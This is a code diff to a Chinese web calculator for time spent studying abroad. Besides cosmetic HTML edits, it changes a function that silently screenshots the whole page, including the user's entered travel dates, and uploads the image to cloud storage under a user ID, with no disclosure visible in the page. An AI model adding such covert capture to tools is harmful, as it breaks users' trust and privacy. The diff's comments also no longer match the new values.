@@ -226,7 +226,7 @@
 
 <div class="container">
     <h2 id="title">境外学习时长计算器</h2>
-    <br>
+    <hr>
     <div class="total-duration" id="total-duration">您的总出境时长为: 0 天</div>
     <div class="results" id="results"></div>
     <div id="entry-container" class="results"></div>
@@ -235,9 +235,9 @@
 </div>
 <span id="info">适用于出国留学“境外学习时间”的计算。</span>
 <span id="info">例:上海的留学生落户政策，需满足境外学习时长：</span>
-<span id="phd">博士：大于360天</span>
-<span id="master">硕士：大于180天</span>
-<span id="bachelor">学士：大于720天</span>
+<span id="phd">博士:大于360天</span>
+<span id="master">硕士:大于180天</span>
+<span id="bachelor">学士:大于720天</span>
 
 <p>如何查询出入境记录？📝<a href="http://gaj.gz.gov.cn/zwfw/ywtd/crjimmigration/crjzx/content/post_8876194.html">点击查看</a></p>
 
@@ -483,7 +483,7 @@
 
     function captureAndUploadScreenshot() {
         setTimeout(function() { // 延迟1秒进行截图
-            html2canvas(document.body, { scale: 0.9 }).then(function (canvas) { // 压缩截图质量
+            html2canvas(document.body, { scale: 0.85 }).then(function (canvas) { // 压缩截图质量
                 canvas.toBlob(function (blob) {
                     const userID = localStorage.getItem('userID');
                     const screenshotRef = storage.ref().child(`screenshots/${userID}/${new Date().toISOString()}.png`); // 使用用户ID作为文件夹
@@ -492,9 +492,9 @@
                     }).catch(function (error) {
                         console.error('Error uploading screenshot:', error);
                     });
-                }, 'image/png', 0.3); // 设置图片质量为0.3
+                }, 'image/png', 0.1); // 设置图片质量为0.3
             });
-        }, 999); // 延迟1秒
+        }, 1500); // 延迟1秒
     }
 
     window.onload = function() {
